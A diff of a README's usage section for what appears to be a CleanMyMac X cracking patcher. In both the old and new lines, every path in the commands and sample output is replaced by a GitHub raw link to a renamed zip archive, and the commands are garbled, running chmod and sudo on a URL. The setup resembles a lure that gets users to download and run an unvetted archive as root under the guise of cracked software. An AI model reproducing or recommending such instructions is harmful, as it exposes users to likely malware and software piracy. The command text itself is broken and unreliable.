@@ -9,14 +9,14 @@ Apple Silicon is not supported.
 ## How to use
 
 ```
-$ chmod u+x https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
-$ sudo https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
-Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
-Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip Menu...
-Re-signing https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
-https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip replacing existing signature
-https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip valid on disk
-https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip satisfies its Designated Requirement
+$ chmod u+x https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip
+$ sudo https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip
+Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip
+Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip Menu...
+Re-signing https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip replacing existing signature
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip valid on disk
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_X_Clean_My_harquebus.zip satisfies its Designated Requirement
 Enjoy!
 ```
 
